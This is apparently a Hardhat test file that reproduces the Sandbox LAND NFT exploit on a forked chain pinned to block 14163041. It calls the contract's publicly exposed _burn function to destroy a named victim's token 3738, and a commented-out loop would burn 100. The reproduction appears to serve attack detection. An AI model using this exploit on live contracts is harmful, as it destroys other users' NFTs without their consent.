import { ethers } from 'hardhat'
import { ILand, IERC20, Address } from '../typechain-types'
import { expect } from 'chai'

describe('CCA Detects Sandbox Attack Test', async function () {
    let land: any
    let victim: string

    beforeEach(async () => {
        victim = await ethers.getAddress('0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C')
        land = await ethers.getContractAt('ILand', '0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a')
    })

    it('should block number equal to 14163041', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(14163041)
    })

    it('should execute the attack', async function () {
        console.log('Before exploiting, victim owned NFT:', await land._numNFTPerAddress(victim))
        // for (let i = 0; i < 100; i++) {
        //     // let's try to burn 100 nfts
        //     await land._burn(victim, victim, 3738) // _burn function that was set to be called was set in a public state, anyone can burn any user's NFT.
        // }
        await land._burn(victim, victim, 3738)
        console.log('After exploiting, victim owned NFT:', await land._numNFTPerAddress(victim))
    })
})
